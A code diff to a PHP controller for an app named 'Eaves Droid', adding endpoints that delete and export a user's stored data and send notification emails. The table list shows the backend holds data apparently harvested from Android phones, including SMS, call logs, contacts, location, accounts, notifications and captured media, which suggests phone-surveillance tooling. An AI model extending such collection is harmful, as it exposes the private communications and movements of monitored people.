@@ -1204,4 +1204,376 @@ class Advanced extends BaseClientController
         }
         return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
     }
+
+    /**
+     * Unified delete — removes ALL user data across every extractor category.
+     * Includes DB records AND uploaded files on disk. Sends an email notification.
+     */
+    public function delete_all_user_data()
+    {
+        if (!$this->requireAuth()) {
+            return;
+        }
+
+        $userId = $this->userId;
+        $model = new \App\Models\Mod_Finder();
+        $result = $model->deleteAllUserData($userId);
+
+        if ($result['success']) {
+            $this->session->setFlashdata('success', 'All user data has been permanently deleted. A confirmation email has been sent.');
+
+            if (!empty($this->userData['email']) && ($this->userData['email_notifications'] ?? true)) {
+                $this->sendDeleteNotificationEmail($userId, $result['deleted'], $result['total_deleted']);
+            }
+        } else {
+            $this->session->setFlashdata('error', 'Failed to delete some data. Check logs for details.');
+        }
+
+        redirect()->back();
+    }
+
+    /**
+     * Unified export — returns a structured report of all user data organized by extractor category.
+     * Sends an email notification with estimated sizes.
+     */
+    public function export_all_user_data()
+    {
+        if (!$this->requireAuth()) {
+            return;
+        }
+
+        $userId = $this->userId;
+        $model = new \App\Models\Mod_Finder();
+        $data = $model->exportAllUserData($userId);
+
+        if (!empty($this->userData['email']) && ($this->userData['email_notifications'] ?? true)) {
+            $this->sendExportNotificationEmail($userId, $data);
+        }
+
+        header('Content-Type: application/json');
+        header('Content-Disposition: ' . 'attachment; filename="data_export_' . $userId . '_' . date('Ymd_His') . '.json"');
+        echo json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
+        exit;
+    }
+
+    /**
+     * Sends an HTML email notification confirming data deletion.
+     */
+    private function sendDeleteNotificationEmail(int $userId, array $deleted, int $totalDeleted): void
+    {
+        try {
+            $email = \Config\Services::email();
+            $email->initialize([
+                'mailType'  => 'html',
+                'charset'   => 'UTF-8',
+                'wordWrap'  => true,
+            ]);
+
+            $sender = get_notification_sender();
+            $email->setFrom($sender['email'], $sender['name']);
+            $email->setTo($this->userData['email']);
+            $email->setSubject('Eaves Droid — Data Deletion Confirmation');
+
+            $username = $this->userData['username'] ?? 'User';
+            $asAtTimestamp = date('Y-m-d H:i:s');
+
+            // Build detailed category data with table labels
+            $categoryLabels = [
+                'sms' => 'SMS Messages',
+                'calls' => 'Call Logs',
+                'contacts' => 'Contacts',
+                'apps' => 'Installed Apps',
+                'location' => 'Location History',
+                'activity' => 'Activity Log',
+                'files' => 'Device Files',
+                'sim_configs' => 'SIM Configurations',
+                'device_context' => 'Device Context',
+                'network_info' => 'Network Info',
+                'nearby_wifi' => 'Nearby Wi-Fi',
+                'accounts' => 'Accounts',
+                'calendar' => 'Calendar Events',
+                'bluetooth' => 'Bluetooth',
+                'bluetooth_paired' => 'Paired Bluetooth Devices',
+                'sensors' => 'Sensor Profile',
+                'device_profile' => 'Device Profile',
+                'proc_info' => 'Process Info',
+                'running_processes' => 'Running Processes',
+                'running_process_details' => 'Process Details',
+                'running_services' => 'Running Services',
+                'camera_info' => 'Camera Info',
+                'battery_stats' => 'Battery Stats',
+                'accessibility' => 'Accessibility Services',
+                'input_methods' => 'Input Methods',
+                'input_method_subtypes' => 'Input Subtypes',
+                'cell_towers' => 'Cell Tower Data',
+                'display_info' => 'Display Info',
+                'storage' => 'Storage',
+                'thermal' => 'Thermal Data',
+                'nfc' => 'NFC Data',
+                'hardware_graphics' => 'Graphics Hardware',
+                'hardware_network' => 'Network Hardware',
+                'app_security' => 'App Security',
+                'network_security' => 'Network Security',
+                'telephony_network' => 'Telephony Network',
+                'system_locale' => 'System Locale',
+                'apps_notifications' => 'App Notifications',
+                'misc_software' => 'Misc Software Data',
+                'misc_hardware' => 'Misc Hardware Data',
+                'uploaded_files' => 'Uploaded Files',
+                'captured_media' => 'Captured Media',
+                'user_actions' => 'User Actions',
+                'device_config' => 'Device Config',
+                'app_defaults' => 'App Defaults',
+            ];
+
+            $tableLabels = [
+                'tbl_sms' => 'SMS Messages',
+                'tbl_logs' => 'Call Logs',
+                'tbl_contacts' => 'Contacts',
+                'tbl_apps' => 'Installed Apps',
+                'tbl_location' => 'Location History',
+                'tbl_activity' => 'Activity Log',
+                'tbl_device_files' => 'Device Files',
+                'tbl_sim_configs' => 'SIM Configs',
+                'tbl_device_context' => 'Device Context',
+                'tbl_network_info' => 'Network Info',
+                'tbl_nearby_wifi' => 'Nearby Wi-Fi',
+                'tbl_accounts' => 'Accounts',
+                'tbl_calendar_events' => 'Calendar Events',
+                'tbl_bluetooth' => 'Bluetooth',
+                'tbl_bluetooth_paired' => 'Paired Bluetooth',
+                'tbl_sensor_profile' => 'Sensor Profile',
+                'tbl_device_profile' => 'Device Profile',
+                'tbl_proc_info' => 'Process Info',
+                'tbl_running_processes' => 'Running Processes',
+                'tbl_running_process_details' => 'Process Details',
+                'tbl_running_services' => 'Running Services',
+                'tbl_camera_info' => 'Camera Info',
+                'tbl_battery_stats' => 'Battery Stats',
+                'tbl_accessibility_services' => 'Accessibility Services',
+                'tbl_input_methods' => 'Input Methods',
+                'tbl_input_method_subtypes' => 'Input Subtypes',
+                'tbl_cell_towers' => 'Cell Tower Data',
+                'tbl_display_info' => 'Display Info',
+                'tbl_storage' => 'Storage',
+                'tbl_thermal' => 'Thermal Data',
+                'tbl_nfc' => 'NFC Data',
+                'tbl_hardware_graphics' => 'Graphics Hardware',
+                'tbl_hardware_network' => 'Network Hardware',
+                'tbl_app_security' => 'App Security',
+                'tbl_network_security' => 'Network Security',
+                'tbl_telephony_network' => 'Telephony Network',
+                'tbl_system_locale' => 'System Locale',
+                'tbl_app_usage' => 'App Usage',
+                'tbl_app_usage_sessions' => 'App Usage Sessions',
+                'tbl_notifications' => 'Notifications',
+                'tbl_data_usage' => 'Data Usage',
+                'tbl_saved_wifi' => 'Saved Wi-Fi',
+                'tbl_default_apps' => 'Default Apps',
+                'tbl_alarms' => 'Alarms',
+                'tbl_captured_media' => 'Captured Media',
+                'tbl_user_actions' => 'User Actions',
+                'tbl_device_config' => 'Device Config',
+                'tbl_app_defaults' => 'App Defaults',
+            ];
+
+            // Build detailed category data from deleted array
+            $categoriesWithTables = [];
+            $model = new \App\Models\Mod_Finder();
+            foreach (\App\Models\Mod_Finder::TABLE_REGISTRY as $catKey => $tables) {
+                $tableList = is_array($tables) ? $tables : [$tables];
+                $tables = [];
+                foreach ($tableList as $table) {
+                    if (!isset($deleted[$table])) continue;
+                    $tables[] = [
+                        'name'  => $table,
+                        'count' => $deleted[$table],
+                        'label' => $tableLabels[$table] ?? $table,
+                    ];
+                }
+                if (!empty($tables)) {
+                    $categoriesWithTables[$catKey] = [
+                        'tables'       => $tables,
+                        'total_rows'   => array_sum(array_column($tables, 'count')),
+                    ];
+                }
+            }
+
+            $body = view('email/data_delete_notification', [
+                'username'           => $username,
+                'asAtTimestamp'      => date('Y-m-d H:i:s'),
+                'categories'         => $categoriesWithTables,
+                'categoryLabels'     => $categoryLabels,
+                'totalDeleted'       => $totalDeleted,
+                'browser'            => $this->request->getUserAgent()->getAgentString() ?: '',
+                'browserIp'          => $this->request->getIPAddress(),
+                'timestamp'          => date('Y-m-d H:i:s'),
+            ]);
+
+            $email->setMessage($body);
+            $email->send();
+
+            log_message('info', 'Delete notification email sent to user ' . $userId);
+        } catch (\Exception $e) {
+            log_message('error', 'Failed to send delete notification email to user ' . $userId . ' — ' . $e->getMessage());
+        }
+    }
+
+    /**
+     * Sends an HTML email notification confirming data export with estimated sizes.
+     */
+    private function sendExportNotificationEmail(int $userId, array $data): void
+    {
+        try {
+            $email = \Config\Services::email();
+            $email->initialize([
+                'mailType'  => 'html',
+                'charset'   => 'UTF-8',
+                'wordWrap'  => true,
+            ]);
+
+            $sender = get_notification_sender();
+            $email->setFrom($sender['email'], $sender['name']);
+            $email->setTo($this->userData['email']);
+            $email->setSubject('Eaves Droid — Data Export Complete');
+
+            $username = $this->userData['username'] ?? 'User';
+
+            $categoryLabels = [
+                'sms' => 'SMS Messages',
+                'calls' => 'Call Logs',
+                'contacts' => 'Contacts',
+                'apps' => 'Installed Apps',
+                'location' => 'Location History',
+                'activity' => 'Activity Log',
+                'files' => 'Device Files',
+                'sim_configs' => 'SIM Configurations',
+                'device_context' => 'Device Context',
+                'network_info' => 'Network Info',
+                'nearby_wifi' => 'Nearby Wi-Fi',
+                'accounts' => 'Accounts',
+                'calendar' => 'Calendar Events',
+                'bluetooth' => 'Bluetooth',
+                'bluetooth_paired' => 'Paired Bluetooth Devices',
+                'sensors' => 'Sensor Profile',
+                'device_profile' => 'Device Profile',
+                'proc_info' => 'Process Info',
+                'running_processes' => 'Running Processes',
+                'running_process_details' => 'Process Details',
+                'running_services' => 'Running Services',
+                'camera_info' => 'Camera Info',
+                'battery_stats' => 'Battery Stats',
+                'accessibility' => 'Accessibility Services',
+                'input_methods' => 'Input Methods',
+                'input_method_subtypes' => 'Input Subtypes',
+                'cell_towers' => 'Cell Tower Data',
+                'display_info' => 'Display Info',
+                'storage' => 'Storage',
+                'thermal' => 'Thermal Data',
+                'nfc' => 'NFC Data',
+                'hardware_graphics' => 'Graphics Hardware',
+                'hardware_network' => 'Network Hardware',
+                'app_security' => 'App Security',
+                'network_security' => 'Network Security',
+                'telephony_network' => 'Telephony Network',
+                'system_locale' => 'System Locale',
+                'apps_notifications' => 'App Notifications',
+                'misc_software' => 'Misc Software Data',
+                'misc_hardware' => 'Misc Hardware Data',
+                'uploaded_files' => 'Uploaded Files',
+                'captured_media' => 'Captured Media',
+                'user_actions' => 'User Actions',
+                'device_config' => 'Device Config',
+                'app_defaults' => 'App Defaults',
+            ];
+
+            $tableLabels = [
+                'tbl_sms' => 'SMS Messages',
+                'tbl_logs' => 'Call Logs',
+                'tbl_contacts' => 'Contacts',
+                'tbl_apps' => 'Installed Apps',
+                'tbl_location' => 'Location History',
+                'tbl_activity' => 'Activity Log',
+                'tbl_device_files' => 'Device Files',
+                'tbl_sim_configs' => 'SIM Configs',
+                'tbl_device_context' => 'Device Context',
+                'tbl_network_info' => 'Network Info',
+                'tbl_nearby_wifi' => 'Nearby Wi-Fi',
+                'tbl_accounts' => 'Accounts',
+                'tbl_calendar_events' => 'Calendar Events',
+                'tbl_bluetooth' => 'Bluetooth',
+                'tbl_bluetooth_paired' => 'Paired Bluetooth',
+                'tbl_sensor_profile' => 'Sensor Profile',
+                'tbl_device_profile' => 'Device Profile',
+                'tbl_proc_info' => 'Process Info',
+                'tbl_running_processes' => 'Running Processes',
+                'tbl_running_process_details' => 'Process Details',
+                'tbl_running_services' => 'Running Services',
+                'tbl_camera_info' => 'Camera Info',
+                'tbl_battery_stats' => 'Battery Stats',
+                'tbl_accessibility_services' => 'Accessibility Services',
+                'tbl_input_methods' => 'Input Methods',
+                'tbl_input_method_subtypes' => 'Input Subtypes',
+                'tbl_cell_towers' => 'Cell Tower Data',
+                'tbl_display_info' => 'Display Info',
+                'tbl_storage' => 'Storage',
+                'tbl_thermal' => 'Thermal Data',
+                'tbl_nfc' => 'NFC Data',
+                'tbl_hardware_graphics' => 'Graphics Hardware',
+                'tbl_hardware_network' => 'Network Hardware',
+                'tbl_app_security' => 'App Security',
+                'tbl_network_security' => 'Network Security',
+                'tbl_telephony_network' => 'Telephony Network',
+                'tbl_system_locale' => 'System Locale',
+                'tbl_app_usage' => 'App Usage',
+                'tbl_app_usage_sessions' => 'App Usage Sessions',
+                'tbl_notifications' => 'Notifications',
+                'tbl_data_usage' => 'Data Usage',
+                'tbl_saved_wifi' => 'Saved Wi-Fi',
+                'tbl_default_apps' => 'Default Apps',
+                'tbl_alarms' => 'Alarms',
+                'tbl_captured_media' => 'Captured Media',
+                'tbl_user_actions' => 'User Actions',
+                'tbl_device_config' => 'Device Config',
+                'tbl_app_defaults' => 'App Defaults',
+            ];
+
+            $categoriesWithTables = [];
+            foreach ($data['categories'] as $catKey => $catData) {
+                $tables = [];
+                foreach ($catData['tables'] as $tbl) {
+                    $tables[] = [
+                        'name'                 => $tbl['name'],
+                        'count'                => $tbl['count'],
+                        'estimated_size_human' => $tbl['estimated_size_human'],
+                        'label'                => $tableLabels[$tbl['name']] ?? $tbl['name'],
+                    ];
+                }
+                $categoriesWithTables[$catKey] = [
+                    'tables'             => $tables,
+                    'total_rows'         => $catData['total_rows'],
+                    'total_size_human'   => $catData['total_size_human'],
+                ];
+            }
+
+            $body = view('email/data_export_notification', [
+                'username'           => $username,
+                'asAtTimestamp'      => date('Y-m-d H:i:s'),
+                'categories'         => $categoriesWithTables,
+                'categoryLabels'     => $categoryLabels,
+                'totalRows'          => $data['total_rows'],
+                'totalSizeHuman'     => $data['total_size_human'],
+                'browser'            => $this->request->getUserAgent()->getAgentString() ?: '',
+                'browserIp'          => $this->request->getIPAddress(),
+                'timestamp'          => date('Y-m-d H:i:s'),
+            ]);
+
+            $email->setMessage($body);
+            $email->send();
+
+            log_message('info', 'Export notification email sent to user ' . $userId);
+        } catch (\Exception $e) {
+            log_message('error', 'Failed to send export notification email to user ' . $userId . ' — ' . $e->getMessage());
+        }
+    }
 }
